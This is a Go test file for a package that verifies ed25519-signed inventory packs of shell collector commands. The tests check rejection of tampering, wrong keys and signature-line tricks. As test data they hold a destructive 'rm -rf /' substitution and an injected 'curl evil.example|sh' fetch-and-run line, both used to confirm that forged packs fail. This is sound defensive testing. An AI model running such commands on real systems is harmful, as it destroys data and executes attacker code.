package discovery

import (
	"crypto/ed25519"
	"encoding/base64"
	"strings"
	"testing"
)

// signPack produces a signed pack document from a body (a pack without its
// signature line), mirroring what the publish pipeline will do in CI.
func signPack(t testing.TB, body string, priv ed25519.PrivateKey) string {
	t.Helper()
	sig := ed25519.Sign(priv, SignedBytes([]byte(body)))
	return body + "\nsignature: " + base64.StdEncoding.EncodeToString(sig) + "\n"
}

func testKeys(t testing.TB) (ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatalf("generating key: %v", err)
	}
	return pub, priv
}

const validBody = `version: 3
kind: inventory
collectors:
  - id: os-release
    cmd: cat /etc/os-release
  - id: pkgs-rpm
    when: os_family == "rhel"
    cmd: rpm -qa
  - id: pkgs-dpkg
    when: os_family == "debian"
    cmd: dpkg-query -W`

func TestParseAndVerify_ValidPack(t *testing.T) {
	pub, priv := testKeys(t)

	pack, err := ParseAndVerify([]byte(signPack(t, validBody, priv)), pub)
	if err != nil {
		t.Fatalf("verifying valid pack: %v", err)
	}
	if pack.Version != 3 {
		t.Errorf("version = %d, want 3", pack.Version)
	}
	if len(pack.Collectors) != 3 {
		t.Errorf("collectors = %d, want 3", len(pack.Collectors))
	}
}

// A pack whose content changed after signing must not run: this is the whole
// point of shipping collection logic as content rather than code.
func TestParseAndVerify_TamperedPackRejected(t *testing.T) {
	pub, priv := testKeys(t)
	signed := signPack(t, validBody, priv)

	tampered := strings.Replace(signed, "rpm -qa", "rm -rf /", 1)
	if tampered == signed {
		t.Fatal("test setup: tampering did not modify the pack")
	}

	if _, err := ParseAndVerify([]byte(tampered), pub); err == nil {
		t.Fatal("tampered pack was accepted")
	}
}

func TestParseAndVerify_WrongKeyRejected(t *testing.T) {
	_, priv := testKeys(t)
	otherPub, _ := testKeys(t)

	if _, err := ParseAndVerify([]byte(signPack(t, validBody, priv)), otherPub); err == nil {
		t.Fatal("pack signed by a different key was accepted")
	}
}

func TestParseAndVerify_UnsignedRejected(t *testing.T) {
	pub, _ := testKeys(t)

	if _, err := ParseAndVerify([]byte(validBody), pub); err == nil {
		t.Fatal("unsigned pack was accepted")
	}
}

func TestParseAndVerify_RejectsBadPacks(t *testing.T) {
	pub, priv := testKeys(t)

	cases := []struct {
		name string
		body string
	}{
		{"no version", "kind: inventory\ncollectors:\n  - id: a\n    cmd: true"},
		{"no collectors", "version: 1\nkind: inventory\ncollectors: []"},
		{"unsupported kind", "version: 1\nkind: remediation\ncollectors:\n  - id: a\n    cmd: true"},
		{"collector without id", "version: 1\nkind: inventory\ncollectors:\n  - cmd: true"},
		{"collector without cmd", "version: 1\nkind: inventory\ncollectors:\n  - id: a"},
		{"duplicate ids", "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    cmd: true\n  - id: a\n    cmd: false"},
		{"unknown fact in guard", "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    when: hostname == \"x\"\n    cmd: true"},
		{"malformed guard", "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    when: os_family\n    cmd: true"},
		{"unquoted guard value", "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    when: os_family == rhel\n    cmd: true"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := ParseAndVerify([]byte(signPack(t, tc.body, priv)), pub); err == nil {
				t.Fatalf("invalid pack accepted: %s", tc.name)
			}
		})
	}
}

// Packs are text files that pass through git checkouts, editors and HTTP,
// any of which may rewrite line endings. A CRLF pack must still verify —
// otherwise a platform difference is indistinguishable from tampering.
func TestParseAndVerify_ToleratesCRLF(t *testing.T) {
	pub, priv := testKeys(t)
	signed := signPack(t, validBody, priv)

	crlf := strings.ReplaceAll(signed, "\n", "\r\n")
	if _, err := ParseAndVerify([]byte(crlf), pub); err != nil {
		t.Fatalf("CRLF pack rejected: %v", err)
	}
}

// Normalizing line endings must not weaken tamper detection.
func TestParseAndVerify_CRLFTamperingStillRejected(t *testing.T) {
	pub, priv := testKeys(t)
	signed := signPack(t, validBody, priv)

	crlf := strings.ReplaceAll(strings.Replace(signed, "rpm -qa", "rm -rf /", 1), "\n", "\r\n")
	if _, err := ParseAndVerify([]byte(crlf), pub); err == nil {
		t.Fatal("tampered CRLF pack was accepted")
	}
}

func TestSelect_RunsMatchingCollectors(t *testing.T) {
	pub, priv := testKeys(t)
	pack, err := ParseAndVerify([]byte(signPack(t, validBody, priv)), pub)
	if err != nil {
		t.Fatalf("verifying pack: %v", err)
	}

	run, skipped := pack.Select(map[string]string{"os_family": "debian"})
	if len(skipped) != 0 {
		t.Errorf("skipped = %v, want none", skipped)
	}

	got := collectorIDs(run)
	want := []string{"os-release", "pkgs-dpkg"}
	if !equalStrings(got, want) {
		t.Errorf("collectors = %v, want %v", got, want)
	}
}

// If we could not determine a host's OS family, guards depending on it must
// be reported as skipped rather than quietly treated as non-matching — an
// uninventoried host has to be visible as a gap.
func TestSelect_MissingFactSkipsWithReason(t *testing.T) {
	pub, priv := testKeys(t)
	pack, err := ParseAndVerify([]byte(signPack(t, validBody, priv)), pub)
	if err != nil {
		t.Fatalf("verifying pack: %v", err)
	}

	run, skipped := pack.Select(map[string]string{"arch": "x86_64"})

	if ids := collectorIDs(run); !equalStrings(ids, []string{"os-release"}) {
		t.Errorf("collectors = %v, want [os-release]", ids)
	}
	if len(skipped) != 2 {
		t.Fatalf("skipped = %d, want 2", len(skipped))
	}
	for _, s := range skipped {
		if !strings.Contains(s.Reason, "os_family") {
			t.Errorf("skip reason %q does not name the missing fact", s.Reason)
		}
	}
}

func TestWhenExpr(t *testing.T) {
	cases := []struct {
		expr  string
		facts map[string]string
		want  bool
	}{
		{`os_family == "rhel"`, map[string]string{"os_family": "rhel"}, true},
		{`os_family == "rhel"`, map[string]string{"os_family": "debian"}, false},
		{`os_family != "rhel"`, map[string]string{"os_family": "debian"}, true},
		{`os_family == "rhel" || os_family == "suse"`, map[string]string{"os_family": "suse"}, true},
		{`os_family == "rhel" || os_family == "suse"`, map[string]string{"os_family": "alpine"}, false},
		{`os_family == "rhel" && os_major != "7"`, map[string]string{"os_family": "rhel", "os_major": "9"}, true},
		{`os_family == "rhel" && os_major != "7"`, map[string]string{"os_family": "rhel", "os_major": "7"}, false},
		{`os_id == 'ubuntu'`, map[string]string{"os_id": "ubuntu"}, true},
	}

	for _, tc := range cases {
		t.Run(tc.expr, func(t *testing.T) {
			expr, err := parseWhen(tc.expr)
			if err != nil {
				t.Fatalf("parsing %q: %v", tc.expr, err)
			}
			got, err := expr.eval(tc.facts)
			if err != nil {
				t.Fatalf("evaluating %q: %v", tc.expr, err)
			}
			if got != tc.want {
				t.Errorf("%q with %v = %v, want %v", tc.expr, tc.facts, got, tc.want)
			}
		})
	}
}

func collectorIDs(cs []Collector) []string {
	ids := make([]string, len(cs))
	for i, c := range cs {
		ids[i] = c.ID
	}
	return ids
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// Verification strips lines beginning `signature:` before checking the
// signature, which makes every such line a place an attacker could add or
// alter content without invalidating it. Requiring exactly one closes that
// off at the source rather than relying on the YAML parser to reject the
// duplicate key downstream.
func TestParseAndVerify_RequiresExactlyOneSignatureLine(t *testing.T) {
	pub, priv := testKeys(t)
	signed := signPack(t, validBody, priv)

	t.Run("second signature line rejected", func(t *testing.T) {
		doubled := signed + "signature: AAAA\n"
		_, err := ParseAndVerify([]byte(doubled), pub)
		if err == nil {
			t.Fatal("pack with two signature lines was accepted")
		}
		if !strings.Contains(err.Error(), "exactly one") {
			t.Errorf("error = %q, want it to name the signature-line count", err)
		}
	})

	t.Run("no signature line rejected", func(t *testing.T) {
		if _, err := ParseAndVerify([]byte(validBody), pub); err == nil {
			t.Fatal("pack with no signature line was accepted")
		}
	})
}

// A publisher writing `signature : x` — which YAML accepts as the same key —
// must not get a failure indistinguishable from tampering.
func TestSignedBytes_ToleratesSpaceBeforeColon(t *testing.T) {
	spaced := validBody + "\nsignature : AAAA\n"
	if n := countSignatureLines([]byte(spaced)); n != 1 {
		t.Errorf("counted %d signature lines in %q, want 1", n, "signature : ...")
	}
	if strings.Contains(string(SignedBytes([]byte(spaced))), "signature") {
		t.Error("signature line with space before colon was left in the signed bytes")
	}
}

// Only column-0 lines are stripped. An indented `signature:` belongs to a
// scalar's content, and removing it would let pack content be altered without
// invalidating the signature.
func TestSignedBytes_LeavesIndentedSignatureLines(t *testing.T) {
	body := "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    cmd: |\n      echo signature: not-a-key\nsignature: AAAA\n"

	got := string(SignedBytes([]byte(body)))
	if !strings.Contains(got, "echo signature: not-a-key") {
		t.Errorf("indented signature line was stripped from signed bytes:\n%s", got)
	}
	if countSignatureLines([]byte(body)) != 1 {
		t.Error("indented line was counted as a top-level signature line")
	}
}

// Direct attempt at forging a pack by exploiting signature-line stripping:
// take a validly signed pack and try to inject a command without the key.
func TestParseAndVerify_SignatureLineInjectionIsRejected(t *testing.T) {
	pub, priv := testKeys(t)

	original := "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    cmd: \"echo hi\""
	sig := ed25519.Sign(priv, SignedBytes([]byte(original)))
	sigB64 := base64.StdEncoding.EncodeToString(sig)

	attempts := map[string]string{
		"extra stripped line carrying a command": original + "\nsignature: ; curl evil.example|sh\nsignature: " + sigB64 + "\n",
		"line absorbed into an open scalar":      "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    cmd: \"echo hi\nsignature: ; curl evil.example|sh\"\nsignature: " + sigB64 + "\n",
	}

	for name, doc := range attempts {
		t.Run(name, func(t *testing.T) {
			pack, err := ParseAndVerify([]byte(doc), pub)
			if err != nil {
				return // rejected, as required
			}
			for _, c := range pack.Collectors {
				if strings.Contains(c.Cmd, "curl evil.example") {
					t.Fatalf("forged command passed verification: %q", c.Cmd)
				}
			}
		})
	}
}

func BenchmarkParseFacts(b *testing.B) {
	probe := "NAME=\"Ubuntu\"\nVERSION=\"22.04.3 LTS\"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID=\"22.04\"\n---\nx86_64"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = parseFacts(probe)
	}
}

func BenchmarkParseAndVerify(b *testing.B) {
	pub, priv := testKeys(b)
	body := "version: 1\nkind: inventory\ncollectors:\n  - id: a\n    cmd: \"echo hi\"\n"
	sig := ed25519.Sign(priv, SignedBytes([]byte(body)))
	doc := []byte(body + "signature: " + base64.StdEncoding.EncodeToString(sig) + "\n")

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = ParseAndVerify(doc, pub)
	}
}

func BenchmarkPackSelect(b *testing.B) {
	pub, priv := testKeys(b)
	pack, err := ParseAndVerify([]byte(signPack(b, validBody, priv)), pub)
	if err != nil {
		b.Fatalf("verifying pack: %v", err)
	}
	facts := map[string]string{"os_family": "debian", "arch": "x86_64", "os_id": "ubuntu", "os_major": "22"}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, _ = pack.Select(facts)
	}
}
